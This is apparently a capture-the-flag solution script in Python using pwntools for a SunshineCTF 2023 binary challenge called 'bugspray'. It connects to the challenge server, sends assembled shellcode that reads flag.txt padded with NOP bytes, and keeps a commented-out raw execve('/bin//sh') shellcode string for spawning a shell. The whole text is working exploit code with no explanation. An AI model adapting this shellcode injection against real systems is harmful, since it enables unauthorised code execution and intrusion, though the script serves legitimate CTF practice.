from pwn import *

context.binary = exe = ELF('./bugspray')

#io = process()
#gdb.attach(io, api=True)
io = remote('chal.2023.sunshinectf.games', 23004)

io.recvuntil(b'>>> ')
#payload = b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x48\x31\xD2\x0F\x05"
payload = asm(shellcraft.amd64.linux.cat('flag.txt'))
payload = payload + b'\x90'*(68-len(payload))
io.sendline(payload)
io.interactive()
